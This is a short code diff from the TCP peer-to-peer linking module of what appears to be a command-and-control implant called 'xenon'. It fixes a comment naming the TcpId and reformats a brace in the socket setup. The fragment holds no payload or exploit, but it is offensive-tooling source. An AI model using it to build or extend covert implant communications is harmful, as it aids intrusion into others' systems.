@@ -36,7 +36,7 @@ BOOL TcpSend(PPackage package)
 	BOOL   Success = FALSE;
 
     /* Prepend P2P Linking ID to Package
-     * This SmbId is used by the receiving agent (via LinkPush) to verify
+     * This TcpId is used by the receiving agent (via LinkPush) to verify
      * that the message came from the correct linked agent */
     PPackage Send = PackageInit(NULL, FALSE);
     PackageAddInt32(Send, xenonConfig->TcpId);
@@ -226,7 +226,8 @@ BOOL TcpSocketCreate()
             _dbg("[TCP] accept TCP OK");
             _dbg("[TCP] Setting up Non-blocking mode");
             u_long mode = 1;
-            if (ioctlsocket(xenonConfig->TcpSocketClient, FIONBIO, &mode) == SOCKET_ERROR) {
+            if (ioctlsocket(xenonConfig->TcpSocketClient, FIONBIO, &mode) == SOCKET_ERROR)
+            {
                 _dbg("ioctlsocket failed: %d\n", WSAGetLastError());
                 return FALSE;
             }
